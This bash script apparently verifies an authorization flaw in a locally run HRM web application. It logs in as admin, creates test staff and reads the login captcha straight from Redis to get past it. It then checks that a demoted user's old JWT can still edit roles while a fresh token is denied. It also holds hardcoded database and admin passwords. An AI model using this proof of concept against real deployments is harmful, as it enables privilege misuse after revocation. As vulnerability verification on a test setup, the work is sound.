#!/usr/bin/env bash
set -u
B=http://localhost:8888
MYSQL="docker exec hrm-mysql mysql -uroot -p123456 -N"
ADMIN_PW='Admin123!'
DEF_PW='123'
HIGH=1
LOW=9
EDITROLE=2

jwt() { echo "$1" | cut -d. -f2 | python3 -c "import sys,base64,json;s=sys.stdin.read().strip();s+='='*(-len(s)%4);d=json.loads(base64.urlsafe_b64decode(s));p=d.get('permissions','') or '';print('staffId=%s role:edit=%s'%(d.get('staffId'),'permission:role:edit' in p.split(',')))" 2>/dev/null || echo "decode-fail"; }

login() {
  curl -s "$B/validate/code" -o /dev/null
  local cap; cap=$(docker exec hrm-redis redis-cli get validate:code | tr -d '\r"')
  curl -s -D /tmp/hc_hdr -o /dev/null -X POST "$B/login/$cap" -H 'Content-Type: application/json' -d "{\"code\":\"$1\",\"password\":\"$2\"}"
  grep -i 'set-cookie:.*token=' /tmp/hc_hdr | head -1 | sed -E 's/.*[^A-Za-z]token=([^;]+);.*/\1/'
}

bcode() { python3 -c "import sys,json;print(json.load(sys.stdin).get('code',''))" 2>/dev/null; }
putrole() { curl -s -X PUT "$B/role" -H "Authorization: Bearer $1" -H 'Content-Type: application/json' -d "{\"id\":$EDITROLE,\"remark\":\"hc-$(date +%s)-$RANDOM\"}" | bcode; }
setrole() { curl -s -X POST "$B/staff/set/$2" -H "Authorization: Bearer $1" -H 'Content-Type: application/json' -d "[$3]" | bcode; }
addstaff() { curl -s -X POST "$B/staff" -H "Authorization: Bearer $1" -H 'Content-Type: application/json' -d "{\"name\":\"$2\",\"deptId\":12}" | bcode; }
idof() { $MYSQL -e "SELECT id FROM hrm.sys_staff WHERE name='$1' ORDER BY id DESC LIMIT 1;" 2>/dev/null | tr -d '\r'; }

echo "== reset handcheck staff =="
$MYSQL -e "DELETE sr FROM hrm.per_staff_role sr JOIN hrm.sys_staff s ON s.id=sr.staff_id WHERE s.name IN ('HC_Victim','HC_Plain'); DELETE FROM hrm.sys_staff WHERE name IN ('HC_Victim','HC_Plain');" >/dev/null 2>&1

echo "== admin login =="
TA=$(login admin "$ADMIN_PW"); echo "  admin: $(jwt "$TA")"

echo "== admin creates victim + plain (default pwd $DEF_PW, code staff_<id>) =="
echo "  add victim=$(addstaff "$TA" HC_Victim)  add plain=$(addstaff "$TA" HC_Plain)"
VID=$(idof HC_Victim); PID=$(idof HC_Plain)
echo "  victimId=$VID plainId=$PID (login code staff_$VID / staff_$PID)"

echo "== admin assigns victim HIGH role $HIGH, plain LOW role $LOW =="
echo "  set victim->$HIGH: $(setrole "$TA" "$VID" "$HIGH")  set plain->$LOW: $(setrole "$TA" "$PID" "$LOW")"

echo "== NEG CONTROL: plain (role $LOW, no role:edit) PUT /role -> expect body code 1300 (denied) =="
TPL=$(login "staff_$PID" "$DEF_PW"); echo "  plain token: $(jwt "$TPL")"
C_NEG=$(putrole "$TPL"); echo "  neg body-code=$C_NEG"

echo "== victim login (OLD token, role $HIGH) =="
TV=$(login "staff_$VID" "$DEF_PW"); echo "  victim_old: $(jwt "$TV")"

echo "== TRIPLE (ALLOWED=body code 200, DENIED=body code 1300) =="
C_SRC=$(putrole "$TV"); echo "  source (victim_old PUT /role) code=$C_SRC"
C_TR=$(setrole "$TA" "$VID" "$LOW"); echo "  transition (admin demote victim->$LOW) code=$C_TR"
C_AFT=$(putrole "$TV"); echo "  follow-up (victim_old SAME token PUT /role) code=$C_AFT"
TVN=$(login "staff_$VID" "$DEF_PW"); echo "  victim_new: $(jwt "$TVN")"
C_NEW=$(putrole "$TVN"); echo "  D1 (victim_new token PUT /role) code=$C_NEW"

echo "== VERDICT =="
ok=1
[ "$C_SRC" = 200 ] || { echo "  X source not allowed (code $C_SRC)"; ok=0; }
[ "$C_TR" = 200 ] || { echo "  X transition not ok (code $C_TR)"; ok=0; }
[ "$C_AFT" = 200 ] || { echo "  X old-token after not allowed (code $C_AFT)"; ok=0; }
[ "$C_NEW" = 1300 ] || { echo "  X new-token not denied (code $C_NEW)"; ok=0; }
[ "$C_NEG" = 1300 ] || { echo "  X neg not denied (code $C_NEG)"; ok=0; }
if [ "$ok" = 1 ]; then
  echo "  PASS: MR-A1 confirmed on running hrm $(git -C app/hrm-server rev-parse --short HEAD 2>/dev/null)"
  echo "  old-token(role:edit) after demotion allowed(code $C_AFT) vs new-token denied(code $C_NEW) ; neg denied(code $C_NEG)"
  echo "  NOTE: hrm signals denial as HTTP 200 + body code 1300, not HTTP 403"
  exit 0
else echo "  FAIL"; exit 1; fi
